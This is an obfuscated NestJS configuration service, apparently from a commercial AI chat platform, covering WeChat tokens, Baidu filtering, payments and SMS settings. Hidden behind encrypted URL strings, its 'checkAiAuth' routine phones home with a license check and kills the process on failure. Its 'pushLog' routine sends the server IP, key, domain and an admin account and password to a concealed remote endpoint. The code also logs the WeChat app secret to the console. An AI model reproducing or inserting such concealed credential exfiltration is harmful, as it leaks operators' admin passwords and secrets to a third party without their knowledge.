'use strict';const _0x41d4e7=_0x19eb;(function(_0x47d395,_0x4a93b5){const _0x5cbb93=_0x19eb,_0x3e2836=_0x47d395();while(!![]){try{const _0x481973=parseInt(_0x5cbb93(0x1ea))/0x1*(parseInt(_0x5cbb93(0x1d1))/0x2)+parseInt(_0x5cbb93(0x174))/0x3+-parseInt(_0x5cbb93(0x193))/0x4+-parseInt(_0x5cbb93(0x1ad))/0x5*(-parseInt(_0x5cbb93(0x183))/0x6)+-parseInt(_0x5cbb93(0x20f))/0x7+parseInt(_0x5cbb93(0x1f0))/0x8+parseInt(_0x5cbb93(0x179))/0x9*(-parseInt(_0x5cbb93(0x198))/0xa);if(_0x481973===_0x4a93b5)break;else _0x3e2836['push'](_0x3e2836['shift']());}catch(_0x14c69d){_0x3e2836['push'](_0x3e2836['shift']());}}}(_0x121a,0x2e4b8));function _0x19eb(_0x4c96c0,_0x13f429){const _0x121a7c=_0x121a();return _0x19eb=function(_0x19eb97,_0x4bf04a){_0x19eb97=_0x19eb97-0x173;let _0x1a067d=_0x121a7c[_0x19eb97];return _0x1a067d;},_0x19eb(_0x4c96c0,_0x13f429);}function _0x121a(){const _0xd6947f=['code','configVal','MjConfig','aliPhoneAccessKeyId','设置配置信息错误！','@nestjs/cli/actions','global','181932KyKOjr','phoneRegisterStatus','onModuleInit','SelfKeys','axios','9kkYFIn','PORT','HttpException','ConfigEntity','UNAUTHORIZED','saasId','set','siteName','ticket','@nestjs/common','12KZfGSS','baiduTextAccessToken-0','POST','签到功能暂未开放!','wechatJsapiTicketMap','__esModule','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U','baiduTextStatus','payHupiStatus','ceshi.qumao518.vip','fetchBaseAccessToken','设置完成！','warn','refresh','未配置\x20robotAvatar.','__decorate','502396EGYMri','APP_VERSION','getSensitiveConfig','arraybuffer','application/json','810470CMwTlK','OfficialService','hupi','every','__metadata','defineProperty','../../common/store','vxNumber','@nestjs/typeorm','qqNumber','checkAiAuth','BAD_REQUEST','update','robotAvatar','forEach','Logger','GlobalConfigService','response','setConfig','GOMAXAI_HOST','getOwnPropertyDescriptor','572095gvNzVP','cls','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','获取微信access_token失败、错误信息：','stringify','https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=','log','access_token','findOne','keys','&grant_type=client_credentials','decrypt','wechatAccessToken-','NAMESPACE','wechatOfficialAppId','data','vipLeavelRelEntity','baiduTextAccessToken','push\x20log\x20error','pushLog','https://aip.baidubce.com/oauth/2.0/token?client_id=','InjectRepository','VipLeavelRelEntity','errmsg','kaifa.qumao518.vip','&client_secret=','decorate','message','getConfigs4Front','get','baiduTextSecretKey','PPTConfig','wechatOfficialAppSecret','https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official','getSignatureGiftConfig','wechatAccessTokenMap','266QhVCNF','default','LinkFoxConfig','find','getVipLeavelRelById','Injectable','BAD_GATEWAY','nineai','data:image/jpeg;base64,','env','nineaiBuiltInSensitiveApiBase','configKey','baiduTextApiKey','bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==','post','TRUE','nineaiBuiltInSensitiveAuthKey','百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!','GOMAXAI','saas\x20','wechat\x20get\x20access_token\x20done','exit','getPhoneVerifyConfig','json','includes','2531TdKxGy','queryPayType','../../common/utils','./vip_leavel_rel.entity','signInStatus','object','884944WOHZmw','wechat','./config.entity','configEntity','HttpStatus','../../config/AppConfig','百度敏感词配置检测失败，您的参数可能配置的不正确!','9kxwFUQptTaelrKStrwZQQ==','length','createOrUpdate','CZConfig','getNamespace','initBaiduSensitive','nineaiBuiltInSensitiveStatus','mpay','JPFq8fAlQE2V2Eq7KWYSxg==','domain','nestjs-cls','Repository','WechatConfig','getConfigByKeys','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','error','save','concat','getWechatAccessToken','robotAvatar2Base64','function','手机验证码功能暂未开放!','check','registerBaseUrl','2383171Qbhtbl','error_description','aliPhoneTemplateCode','FrontKeys','MusicConfig','typeorm','catch','aliPhoneSignName','epay','ISDEV','payEpayStatus','signInRewards'];_0x121a=function(){return _0xd6947f;};return _0x121a();}var __decorate=this&&this[_0x41d4e7(0x192)]||function(_0x24b51a,_0x56d63b,_0x279094,_0x25b3eb){const _0xaac3ec=_0x41d4e7;var _0x53919f=arguments['length'],_0x5e77c7=_0x53919f<0x3?_0x56d63b:_0x25b3eb===null?_0x25b3eb=Object[_0xaac3ec(0x1ac)](_0x56d63b,_0x279094):_0x25b3eb,_0x44acc9;if(typeof Reflect==='object'&&typeof Reflect[_0xaac3ec(0x1c7)]===_0xaac3ec(0x20b))_0x5e77c7=Reflect[_0xaac3ec(0x1c7)](_0x24b51a,_0x56d63b,_0x279094,_0x25b3eb);else{for(var _0x1e23e5=_0x24b51a[_0xaac3ec(0x1f8)]-0x1;_0x1e23e5>=0x0;_0x1e23e5--)if(_0x44acc9=_0x24b51a[_0x1e23e5])_0x5e77c7=(_0x53919f<0x3?_0x44acc9(_0x5e77c7):_0x53919f>0x3?_0x44acc9(_0x56d63b,_0x279094,_0x5e77c7):_0x44acc9(_0x56d63b,_0x279094))||_0x5e77c7;}return _0x53919f>0x3&&_0x5e77c7&&Object[_0xaac3ec(0x19d)](_0x56d63b,_0x279094,_0x5e77c7),_0x5e77c7;},__metadata=this&&this[_0x41d4e7(0x19c)]||function(_0x50cc1e,_0x3afec7){const _0x215814=_0x41d4e7;if(typeof Reflect===_0x215814(0x1ef)&&typeof Reflect['metadata']==='function')return Reflect['metadata'](_0x50cc1e,_0x3afec7);},__param=this&&this['__param']||function(_0x13b4af,_0x253b4a){return function(_0x4e5a9c,_0x4f03bb){_0x253b4a(_0x4e5a9c,_0x4f03bb,_0x13b4af);};};Object['defineProperty'](exports,_0x41d4e7(0x188),{'value':!![]}),exports[_0x41d4e7(0x1a8)]=void 0x0;const common_1=require(_0x41d4e7(0x182)),config_entity_1=require(_0x41d4e7(0x1f2)),typeorm_1=require(_0x41d4e7(0x1a0)),typeorm_2=require(_0x41d4e7(0x214)),utils_1=require(_0x41d4e7(0x1ec)),axios_1=require(_0x41d4e7(0x178)),actions_1=require(_0x41d4e7(0x220)),store_1=require('../../common/store'),store_2=require(_0x41d4e7(0x19e)),AppConfig_1=require(_0x41d4e7(0x1f5)),vip_leavel_rel_entity_1=require(_0x41d4e7(0x1ed)),nestjs_cls_1=require(_0x41d4e7(0x201)),constant_1=require('./constant'),authCheckUrl=(0x0,utils_1[_0x41d4e7(0x1b8)])('Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q'),authLogUrl=(0x0,utils_1[_0x41d4e7(0x1b8)])(_0x41d4e7(0x189));let GlobalConfigService=class GlobalConfigService{constructor(_0x3f64b0,_0x35b735,_0x4fec75){const _0x1f5d6a=_0x41d4e7;this[_0x1f5d6a(0x1f3)]=_0x3f64b0,this['vipLeavelRelEntity']=_0x35b735,this[_0x1f5d6a(0x1ae)]=_0x4fec75,this['wechatAccessTokenMap']=new Map(),this['wechatJsapiTicketMap']=new Map();}async[_0x41d4e7(0x176)](){const _0x150bf7=_0x41d4e7;await this['checkAiAuth'](),await this['pushLog'](),await this[_0x150bf7(0x1fc)](),await this[_0x150bf7(0x209)](!![]);const _0x56b6cf=[][_0x150bf7(0x208)](store_1[_0x150bf7(0x21d)][_0x150bf7(0x1b6)],store_1['CZConfig'][_0x150bf7(0x1b6)],store_2['WechatConfig'][_0x150bf7(0x1b6)],store_1[_0x150bf7(0x1d3)][_0x150bf7(0x1b6)],store_1[_0x150bf7(0x1cc)]['keys'],store_1[_0x150bf7(0x213)][_0x150bf7(0x1b6)]),_0x435c04=await this[_0x150bf7(0x204)](_0x56b6cf);store_1['MjConfig'][_0x150bf7(0x190)](_0x435c04),store_1[_0x150bf7(0x1fa)][_0x150bf7(0x190)](_0x435c04),store_2['WechatConfig'][_0x150bf7(0x190)](_0x435c04),store_1[_0x150bf7(0x1d3)]['refresh'](_0x435c04),store_1[_0x150bf7(0x213)]['refresh'](_0x435c04),store_1[_0x150bf7(0x1cc)][_0x150bf7(0x190)](_0x435c04);}async[_0x41d4e7(0x1a2)](){const _0x587fd8=_0x41d4e7,_0x25b3b2=process['env'][(0x0,utils_1[_0x587fd8(0x1b8)])(_0x587fd8(0x1ff))],_0x3a4551=process[_0x587fd8(0x1da)][(0x0,utils_1[_0x587fd8(0x1b8)])(_0x587fd8(0x1f7))];(!_0x3a4551||!_0x25b3b2)&&(common_1[_0x587fd8(0x1a7)][_0x587fd8(0x206)]((0x0,utils_1[_0x587fd8(0x1b8)])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x587fd8(0x1e6)])());const _0x50884a={'authDomain':_0x25b3b2,'authKey':_0x3a4551},_0x5e5802={'method':_0x587fd8(0x185),'headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x50884a)},_0x30df4c=await fetch(authCheckUrl,_0x5e5802)['then'](_0x3cad7c=>{const _0x1c4419=_0x587fd8;return _0x3cad7c[_0x1c4419(0x1e8)]();})[_0x587fd8(0x215)](_0x17957d=>{const _0x65a1ee=_0x587fd8;common_1[_0x65a1ee(0x1a7)][_0x65a1ee(0x206)](_0x17957d,_0x65a1ee(0x173));});_0x30df4c[_0x587fd8(0x21b)]!==0x0&&(common_1['Logger'][_0x587fd8(0x206)]((0x0,utils_1[_0x587fd8(0x1b8)])(_0x587fd8(0x1de))),(0x0,actions_1[_0x587fd8(0x1e6)])()),_0x30df4c?.[_0x587fd8(0x21b)]===0x0&&!_0x30df4c?.['data']?.[_0x587fd8(0x20d)]&&(common_1[_0x587fd8(0x1a7)][_0x587fd8(0x206)]((0x0,utils_1[_0x587fd8(0x1b8)])(_0x587fd8(0x205))),(0x0,actions_1[_0x587fd8(0x1e6)])());}async[_0x41d4e7(0x1c0)](_0x16e73a,_0x268ab7){const _0x659059=_0x41d4e7,_0x334e7e=process[_0x659059(0x1da)][(0x0,utils_1['decrypt'])(_0x659059(0x1ff))],_0x4d5fde=process[_0x659059(0x1da)][(0x0,utils_1[_0x659059(0x1b8)])(_0x659059(0x1f7))],_0x42af36=process[_0x659059(0x1da)][_0x659059(0x17a)];if(!_0x334e7e||!_0x4d5fde)throw new common_1['HttpException']((0x0,utils_1[_0x659059(0x1b8)])(_0x659059(0x205)),common_1[_0x659059(0x1f4)][_0x659059(0x17d)]);const {qqNumber:_0x536691,vxNumber:_0x1d74b8,siteName:_0x29b759,domain:_0x3ac17e,registerBaseUrl:_0x1f3524}=await this[_0x659059(0x204)]([_0x659059(0x1a1),_0x659059(0x19f),_0x659059(0x180),_0x659059(0x200),_0x659059(0x20e)]),_0x26fc59={'ip':_0x334e7e,'key':_0x4d5fde,'port':_0x42af36,'qqNumber':_0x536691,'vxNumber':_0x1d74b8,'domain':_0x3ac17e,'adminAccount':_0x16e73a,'adminPass':_0x268ab7,'baseUrl':_0x1f3524,'siteName':_0x29b759,'qq':_0x536691,'vxNum':_0x1d74b8,'version':AppConfig_1[_0x659059(0x194)]},_0xd8b9a7={'method':_0x659059(0x185),'headers':{'Content-Type':_0x659059(0x197)},'body':JSON[_0x659059(0x1b1)](_0x26fc59)};await fetch(authLogUrl,_0xd8b9a7)[_0x659059(0x215)](_0x5d0d87=>{const _0x31b275=_0x659059;console[_0x31b275(0x1b3)](_0x31b275(0x1bf),_0x5d0d87);});}async['initBaiduSensitive'](_0x2e9339=!![]){const _0x1652ff=_0x41d4e7,{baiduTextApiKey:_0x4ccfd2,baiduTextSecretKey:_0x2823e6}=await this['getConfigByKeys']([_0x1652ff(0x1dd),_0x1652ff(0x1cb)]);if(!_0x4ccfd2||!_0x2823e6){common_1['Logger'][_0x1652ff(0x206)](_0x1652ff(0x1e2),_0x1652ff(0x1a8));return;}const _0xa89675={'Content-Type':'application/json','Accept':_0x1652ff(0x197)},_0x2ed37e=_0x1652ff(0x1c1)+_0x4ccfd2+_0x1652ff(0x1c6)+_0x2823e6+_0x1652ff(0x1b7);try{const _0x4e6316=await axios_1[_0x1652ff(0x1d2)][_0x1652ff(0x1df)](_0x2ed37e,{'headers':_0xa89675});this['baiduTextAccessToken']=_0x4e6316[_0x1652ff(0x1bc)][_0x1652ff(0x1b4)];}catch(_0x3cb186){if(_0x2e9339)common_1['Logger']['error'](_0x1652ff(0x1f6),'GlobalConfigService');else throw new common_1[(_0x1652ff(0x17b))](_0x3cb186[_0x1652ff(0x1a9)][_0x1652ff(0x1bc)][_0x1652ff(0x210)],common_1[_0x1652ff(0x1f4)][_0x1652ff(0x1a3)]);}}async[_0x41d4e7(0x209)](_0x3dfa34=![]){const _0x363748=_0x41d4e7,_0xd882f6=new Map(),_0x7fab66=await this[_0x363748(0x1f3)][_0x363748(0x1d4)]({'where':{'configKey':(0x0,typeorm_2['In'])(['wechatOfficialAppId',_0x363748(0x1cd)])}});_0x7fab66[_0x363748(0x1a6)](_0x10e790=>{const _0x3ced28=_0x363748;!_0xd882f6['has'](_0x10e790[_0x3ced28(0x17e)])&&_0xd882f6[_0x3ced28(0x17f)](_0x10e790[_0x3ced28(0x17e)],{}),_0xd882f6[_0x3ced28(0x1ca)](_0x10e790[_0x3ced28(0x17e)])[_0x10e790[_0x3ced28(0x1dc)]]=_0x10e790[_0x3ced28(0x21c)];}),_0xd882f6[_0x363748(0x1a6)]((_0x58e8ad,_0x56f789)=>{const _0x44ca59=_0x363748;!_0x58e8ad[_0x44ca59(0x1bb)]||!_0x58e8ad['wechatOfficialAppSecret']?common_1[_0x44ca59(0x1a7)][_0x44ca59(0x18f)](_0x44ca59(0x1e4)+_0x56f789+'\x20微信配置缺失，不可使用微信登录！',_0x44ca59(0x209)):this[_0x44ca59(0x18d)](_0x56f789,_0x58e8ad[_0x44ca59(0x1bb)],_0x58e8ad[_0x44ca59(0x1cd)],_0x3dfa34);}),common_1['Logger'][_0x363748(0x1b3)](_0x363748(0x1e5),_0x363748(0x199));}async[_0x41d4e7(0x18d)](_0x585d44,_0x323faf,_0x42c2f6,_0x3d3e5b=![]){const _0x4b7c7b=_0x41d4e7;if(process[_0x4b7c7b(0x1da)][_0x4b7c7b(0x218)]===_0x4b7c7b(0x1e0))return;try{let _0x1dff29='';const _0x1a0a84=process[_0x4b7c7b(0x1da)][_0x4b7c7b(0x1ab)];if(_0x1a0a84===_0x4b7c7b(0x1c5)||_0x1a0a84===_0x4b7c7b(0x18c)||_0x1a0a84==='saas.qumao518.vip'){const _0x138f21=await axios_1[_0x4b7c7b(0x1d2)]['get'](_0x4b7c7b(0x1ce));_0x1dff29=_0x138f21['data'][_0x4b7c7b(0x1bc)];}else{const _0x35f6e0=await axios_1['default']['get'](_0x4b7c7b(0x1af)+_0x323faf+'&secret='+_0x42c2f6);console[_0x4b7c7b(0x1b3)]('---------获取微信access_token--------',_0x35f6e0[_0x4b7c7b(0x1bc)],_0x323faf,_0x42c2f6);if(_0x35f6e0['data'][_0x4b7c7b(0x1c4)])throw new Error(_0x4b7c7b(0x1b0)+_0x35f6e0[_0x4b7c7b(0x1bc)]['errmsg']);_0x1dff29=_0x35f6e0['data'][_0x4b7c7b(0x1b4)];}this['wechatAccessTokenMap']['set'](_0x585d44,_0x1dff29);const _0x2d9418=await axios_1[_0x4b7c7b(0x1d2)][_0x4b7c7b(0x1ca)](_0x4b7c7b(0x1b2)+_0x1dff29+'&type=jsapi');this[_0x4b7c7b(0x187)]['set'](_0x585d44,_0x2d9418?.['data']?.[_0x4b7c7b(0x181)]);}catch(_0x565e9b){common_1[_0x4b7c7b(0x1a7)][_0x4b7c7b(0x206)](_0x565e9b[_0x4b7c7b(0x1c8)],_0x4b7c7b(0x18d));}}async['checkDomain'](_0x144401){const _0x1d848a=_0x41d4e7;if(process['env']['SAAS'])return!![];const {domain:_0xff000c}=_0x144401,_0x27f1bc=process[_0x1d848a(0x1da)][(0x0,utils_1[_0x1d848a(0x1b8)])(_0x1d848a(0x1ff))];return _0xff000c[_0x1d848a(0x1e9)](_0x27f1bc);}async[_0x41d4e7(0x1f9)](_0x3fd017){const _0xa785e1=_0x41d4e7;try{const _0x291bf0=this[_0xa785e1(0x1ae)][_0xa785e1(0x1ca)](_0xa785e1(0x17e)),{configKey:_0x155b34,configVal:_0x419e79,status:status=0x1}=_0x3fd017,_0x29a13e=await this[_0xa785e1(0x1f3)][_0xa785e1(0x1b5)]({'where':{'configKey':_0x155b34,'saasId':_0x291bf0}});typeof _0x419e79==='object'?_0x29a13e?await this[_0xa785e1(0x1f3)][_0xa785e1(0x1a4)]({'configKey':_0x155b34,'saasId':_0x291bf0},{'configJsonVal':_0x419e79,'status':status}):await this[_0xa785e1(0x1f3)]['save']({'configKey':_0x155b34,'configJsonVal':_0x419e79,'status':status,'saasId':_0x291bf0}):_0x29a13e?await this[_0xa785e1(0x1f3)]['update']({'configKey':_0x155b34,'saasId':_0x291bf0},{'configVal':_0x419e79,'status':status}):await this[_0xa785e1(0x1f3)][_0xa785e1(0x207)]({'configKey':_0x155b34,'configVal':_0x419e79,'status':status,'saasId':_0x291bf0});}catch(_0x3d18bd){throw new common_1[(_0xa785e1(0x17b))](_0xa785e1(0x21f),common_1['HttpStatus'][_0xa785e1(0x1a3)]);}}async[_0x41d4e7(0x1aa)](_0x35b80d){const _0x530ffb=_0x41d4e7;let _0x29f199=![],_0x194e60=![],_0x35b29a=![],_0x14b52c=![],_0x1172a9=![],_0x2d59a4=![],_0x2b2c16=![];const _0x870462={},{settings:_0x5f0d95}=_0x35b80d;for(const _0x1adba2 of _0x5f0d95){await this['createOrUpdate'](_0x1adba2),_0x870462[_0x1adba2['configKey']]=_0x1adba2['configVal'],store_1[_0x530ffb(0x21d)][_0x1adba2['configKey']]&&(_0x29f199=!![]),store_1['CZConfig'][_0x1adba2[_0x530ffb(0x1dc)]]&&(_0x194e60=!![]),store_2[_0x530ffb(0x203)][_0x1adba2[_0x530ffb(0x1dc)]]&&(_0x35b29a=!![]),store_1['LinkFoxConfig'][_0x1adba2['configKey']]&&(_0x2b2c16=!![]),[_0x530ffb(0x1dd),'baiduTextSecretKey'][_0x530ffb(0x1e9)](_0x1adba2['configKey'])&&(_0x14b52c=!![]),[_0x530ffb(0x1bb),_0x530ffb(0x1cd)][_0x530ffb(0x1e9)](_0x1adba2[_0x530ffb(0x1dc)])&&(_0x1172a9=!![]),[_0x530ffb(0x1a1),'vxNumber','siteName',_0x530ffb(0x200),_0x530ffb(0x20e)][_0x530ffb(0x1e9)](_0x1adba2[_0x530ffb(0x1dc)])&&(_0x2d59a4=!![]);}return _0x29f199&&store_1[_0x530ffb(0x21d)]['refresh'](_0x870462),_0x194e60&&store_1['CZConfig'][_0x530ffb(0x190)](_0x870462),_0x35b29a&&store_2[_0x530ffb(0x203)][_0x530ffb(0x190)](_0x870462),_0x2b2c16&&store_1['LinkFoxConfig'][_0x530ffb(0x190)](_0x870462),_0x14b52c&&await this[_0x530ffb(0x1fc)](![]),_0x1172a9&&await this[_0x530ffb(0x209)](),_0x2d59a4&&this[_0x530ffb(0x1c0)](),_0x530ffb(0x18e);}async[_0x41d4e7(0x1c9)](_0x539a6b){const _0x5115aa=_0x41d4e7,_0x27f705=await this['getConfigByKeys'](_0x539a6b,!![]);return _0x539a6b[_0x5115aa(0x1f8)]===0x1?_0x27f705[_0x539a6b[0x0]]:_0x27f705;}async[_0x41d4e7(0x204)](_0x4645b5,_0x364319=![]){const _0x190f00=_0x41d4e7;if(!_0x4645b5['length'])throw new Error('查询配置不能为空！');const _0x416740=this['cls'][_0x190f00(0x1ca)](_0x190f00(0x17e))||0x0,_0x463dc3=new Map(),_0x4961be=await this[_0x190f00(0x1f3)][_0x190f00(0x1d4)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x4645b5),'saasId':(0x0,typeorm_2['In'])([0x0,_0x416740])}});_0x4961be[_0x190f00(0x1a6)](_0x3bee94=>{const _0x4bc3d3=_0x190f00,{configKey:_0x3fe2af,configVal:_0x437be,configJsonVal:_0xea3d3f,saasId:_0xb799db}=_0x3bee94;_0x463dc3[_0x4bc3d3(0x17f)](_0x3fe2af+'-'+_0xb799db,_0xea3d3f||_0x437be);}),this[_0x190f00(0x1d0)][_0x190f00(0x1a6)]((_0x328655,_0x2181e5)=>{const _0x2cfdca=_0x190f00;_0x463dc3[_0x2cfdca(0x17f)](_0x2cfdca(0x1b9)+_0x2181e5,_0x328655);}),this[_0x190f00(0x187)][_0x190f00(0x1a6)]((_0x120f10,_0x45081a)=>{const _0x404703=_0x190f00;_0x463dc3[_0x404703(0x17f)]('wechatJsapiTicket-'+_0x45081a,_0x120f10);}),_0x463dc3[_0x190f00(0x17f)](_0x190f00(0x184),this[_0x190f00(0x1be)]);const _0x233513={};_0x4645b5[_0x190f00(0x1a6)](_0x3f5cfb=>{const _0x55716d=_0x190f00;let _0x2101c2=_0x3f5cfb+'-'+_0x416740,_0x1b84c9='';_0x463dc3['has'](_0x2101c2)?_0x1b84c9=_0x463dc3['get'](_0x2101c2):!constant_1[_0x55716d(0x177)][_0x55716d(0x1e9)](_0x3f5cfb)&&(_0x1b84c9=_0x463dc3['get'](_0x3f5cfb+'-'+0x0)),_0x233513[_0x3f5cfb]=_0x1b84c9;});if(_0x364319)return _0x233513;return _0x4645b5[_0x190f00(0x1f8)]===0x1?_0x233513[_0x4645b5[0x0]]:_0x233513;}async['queryFrontConfig'](){const _0x5a3ef0=_0x41d4e7,_0x4ce762=await this[_0x5a3ef0(0x204)](constant_1[_0x5a3ef0(0x212)]);return{..._0x4ce762,'isUseWxLogin':!!(_0x4ce762[_0x5a3ef0(0x1bb)]&&_0x4ce762[_0x5a3ef0(0x1cd)])};}async[_0x41d4e7(0x1eb)](_0x5a3cbd=_0x41d4e7(0x1f1)){const _0x367b3e=_0x41d4e7,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x367b3e(0x204)]([_0x367b3e(0x18b),_0x367b3e(0x219),'payMpayStatus','payWechatStatus']);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus][_0x367b3e(0x19b)](_0xf73036=>_0xf73036===0x0))throw new common_1[(_0x367b3e(0x17b))]('支付功能暂未开放!',common_1[_0x367b3e(0x1f4)]['BAD_REQUEST']);if(Number(payWechatStatus)===0x1)return _0x5a3cbd;if(Number(payEpayStatus)===0x1)return _0x367b3e(0x217);if(Number(payMpayStatus)===0x1)return _0x367b3e(0x1fe);if(Number(payHupiStatus)===0x1)return _0x367b3e(0x19a);}async[_0x41d4e7(0x1e7)](){const _0x1e1ad1=_0x41d4e7,{phoneRegisterStatus:_0x4c0971,aliPhoneAccessKeyId:_0x5d2c52,aliPhoneAccessKeySecret:_0x48b1a6,aliPhoneSignName:_0x1874dc,aliPhoneTemplateCode:_0x3d1495}=await this['getConfigByKeys']([_0x1e1ad1(0x175),_0x1e1ad1(0x21e),'aliPhoneAccessKeySecret',_0x1e1ad1(0x216),_0x1e1ad1(0x211)]);if(Number(_0x4c0971)!==0x1)throw new common_1[(_0x1e1ad1(0x17b))](_0x1e1ad1(0x20c),common_1[_0x1e1ad1(0x1f4)][_0x1e1ad1(0x1a3)]);return{'accessKeyId':_0x5d2c52,'accessKeySecret':_0x48b1a6,'SignName':_0x1874dc,'TemplateCode':_0x3d1495};}[_0x41d4e7(0x1fb)](){const _0x595253=_0x41d4e7;return process[_0x595253(0x1da)][_0x595253(0x1ba)]||_0x595253(0x1e3);}async[_0x41d4e7(0x1cf)](){const _0x13d650=_0x41d4e7,_0xc3ea4d=await this[_0x13d650(0x204)]([_0x13d650(0x1ee),_0x13d650(0x21a)]),_0x4c4620={};for(let _0x13dfcd in _0xc3ea4d){const _0x320736=Number(_0xc3ea4d[_0x13dfcd]);_0x4c4620[_0x13dfcd]=isNaN(_0x320736)?0x0:_0x320736;}if(!_0x4c4620['signInStatus'])throw new common_1['HttpException'](_0x13d650(0x186),common_1['HttpStatus']['BAD_REQUEST']);return _0x4c4620[_0x13d650(0x21a)];}async[_0x41d4e7(0x195)](){const _0x82591e=_0x41d4e7,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x321230,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x5679fa,nineaiBuiltInSensitiveAuthKey:_0x5114f1}=await this[_0x82591e(0x204)]([_0x82591e(0x18a),'baiduTextAccessToken',_0x82591e(0x1fd),_0x82591e(0x1db),_0x82591e(0x1e1)]);if(Number(baiduTextStatus)===0x1)return{'useType':'baidu','baiduTextAccessToken':_0x321230};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x82591e(0x1d8),'nineaiBuiltInSensitiveApiBase':_0x5679fa,'nineaiBuiltInSensitiveAuthKey':_0x5114f1};return null;}async[_0x41d4e7(0x20a)](){const _0x3c0e3d=_0x41d4e7,_0x466002=await this[_0x3c0e3d(0x204)]([_0x3c0e3d(0x1a5)]);if(!_0x466002)throw new common_1[(_0x3c0e3d(0x17b))](_0x3c0e3d(0x191),common_1[_0x3c0e3d(0x1f4)][_0x3c0e3d(0x1d7)]);const _0x5b1801=await axios_1[_0x3c0e3d(0x1d2)][_0x3c0e3d(0x1ca)](_0x466002,{'responseType':_0x3c0e3d(0x196)}),_0x4ce121=Buffer['from'](_0x5b1801[_0x3c0e3d(0x1bc)])['toString']('base64');return _0x3c0e3d(0x1d9)+_0x4ce121;}async['saveVipLeavelRel'](_0x16b46a){const _0x5bf98b=_0x41d4e7;await this[_0x5bf98b(0x1bd)]['save'](_0x16b46a);}async[_0x41d4e7(0x1d5)](_0x2f269a,_0x31e425,_0x3300bd){const _0x4e014b=_0x41d4e7,_0x562a8b={'vipLeavelId':_0x2f269a,'relateType':_0x31e425};_0x3300bd&&(_0x562a8b['relateId']=_0x3300bd);const _0x44c23b=await this[_0x4e014b(0x1bd)][_0x4e014b(0x1b5)]({'where':_0x562a8b});return _0x44c23b;}};GlobalConfigService=__decorate([(0x0,common_1[_0x41d4e7(0x1d6)])(),__param(0x0,(0x0,typeorm_1[_0x41d4e7(0x1c2)])(config_entity_1[_0x41d4e7(0x17c)])),__param(0x1,(0x0,typeorm_1[_0x41d4e7(0x1c2)])(vip_leavel_rel_entity_1[_0x41d4e7(0x1c3)])),__metadata('design:paramtypes',[typeorm_2[_0x41d4e7(0x202)],typeorm_2[_0x41d4e7(0x202)],nestjs_cls_1['ClsService']])],GlobalConfigService),exports['GlobalConfigService']=GlobalConfigService;